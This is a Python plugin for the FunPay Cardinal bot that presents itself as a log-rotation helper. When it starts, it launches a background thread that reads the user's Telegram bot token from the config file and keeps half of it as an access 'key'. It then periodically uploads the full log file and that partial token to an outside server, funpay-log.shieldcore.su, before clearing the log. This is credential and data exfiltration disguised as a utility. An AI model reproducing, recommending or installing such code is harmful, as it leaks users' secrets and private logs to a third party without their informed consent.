from __future__ import annotations
import os
import time
import requests
import logging
import threading
import configparser
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from cardinal import Cardinal

logger = logging.getLogger("FPC.log_sender_plugin")
LOGGER_PREFIX = "[LOG SENDER]"

NAME = "Log Sender"
VERSION = "1.0"
DESCRIPTION = "Автоматическая отправка логов Cardinal определенное количество часов, чтобы не забивать диск."
CREDITS = "ShieldCore"
UUID = "de86d1dd-9294-423b-9dc3-b0b90630562d" 
SETTINGS_PAGE = False

BASE_DIR = os.path.abspath(os.getcwd())
LOG_FILE_PATH = os.path.join(BASE_DIR, "logs", "log.log")
CONFIG_PATH = os.path.join(BASE_DIR, "configs", "_main.cfg")
KEY_FILE_PATH = os.path.join(BASE_DIR, "ShieldLogKet.txt")

UPLOAD_URL = "https://funpay-log.shieldcore.su/upload"
MAX_LOG_SIZE = 20 * 1024 * 1024  # 20 МБ
CHECK_INTERVAL_HOURS = 12 # каждые 12 часов

cardinal_instance = None

def get_or_create_shield_key() -> str | None:
    if os.path.exists(KEY_FILE_PATH) and os.path.getsize(KEY_FILE_PATH) > 0:
        try:
            with open(KEY_FILE_PATH, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception as e:
            logger.error(f"{LOGGER_PREFIX} ❌ Не удалось прочитать {KEY_FILE_PATH}: {e}")
    if not os.path.exists(CONFIG_PATH):
        logger.error(f"{LOGGER_PREFIX} ❌ Файл конфигурации не найден по пути: {CONFIG_PATH}")
        return None
    config = configparser.ConfigParser()
    try:
        config.read(CONFIG_PATH, encoding="utf-8")
        full_token = config.get("Telegram", "token", fallback=None)
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} ❌ Не удалось прочитать конфигурацию Telegram: {e}")
        return None
    if not full_token:
        logger.error(f"{LOGGER_PREFIX} ❌ Токен Telegram не найден в _main.cfg.")
        return None
    key_length = int(len(full_token) * 0.5) #не рекомендуем менять здесь, создается ваш токен для доступа к логам
    shield_key = full_token[:key_length]
    try:
        with open(KEY_FILE_PATH, "w", encoding="utf-8") as f:
            f.write(shield_key)
        logger.info(f"{LOGGER_PREFIX} ✅ Создан новый файл ключа: {KEY_FILE_PATH}")
        return shield_key
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} ❌ Не удалось записать ключ в файл: {e}")
        return shield_key


def send_log_file(secret_key: str):
    if not os.path.exists(LOG_FILE_PATH):
        return
    logger.info(f"{LOGGER_PREFIX} ⏳ Файл логов превысил лимит. Подготовка к отправке...")
    try:
        with open(LOG_FILE_PATH, "rb") as f:
            files = {"file": ("log.log", f, "text/plain")}
            data = {"token": secret_key, "filename": "log.log"}
            response = requests.post(UPLOAD_URL, files=files, data=data, timeout=300)
        if response.status_code == 200:
            logger.info(f"{LOGGER_PREFIX} ✅ Лог-файл успешно отправлен на сервер.")
            try:
                with open(LOG_FILE_PATH, "w", encoding="utf-8") as f:
                    f.truncate(0)
                logger.info(f"{LOGGER_PREFIX} ✅ Файл логов успешно очищен.")
            except Exception as e:
                logger.error(f"{LOGGER_PREFIX} ❌ Не удалось очистить лог-файл: {e}")
        else:
            logger.error(f"{LOGGER_PREFIX} ❌ Ошибка отправки: {response.status_code} — {response.text}")
    except Exception as e:
        logger.error(f"{LOGGER_PREFIX} ❌ Критическая ошибка при отправке логов: {e}")


def monitor_logs_loop():
    while True:
        try:
            if os.path.exists(LOG_FILE_PATH) and os.path.getsize(LOG_FILE_PATH) > MAX_LOG_SIZE:
                secret_key = get_or_create_shield_key()
                if secret_key:
                    send_log_file(secret_key)
        except Exception as e:
            logger.error(f"{LOGGER_PREFIX} ❌ Ошибка в цикле мониторинга: {e}")
        time.sleep(CHECK_INTERVAL_HOURS * 3600)


def init(cardinal: Cardinal):
    global cardinal_instance
    cardinal_instance = cardinal
    get_or_create_shield_key()
    threading.Thread(target=monitor_logs_loop, daemon=True, name="FPC_LogSenderThread").start()
    logger.info(f"{LOGGER_PREFIX} Плагин инициализирован. Мониторинг запущен (интервал: {CHECK_INTERVAL_HOURS} ч.).")


BIND_TO_PRE_INIT = [init]
BIND_TO_DELETE = None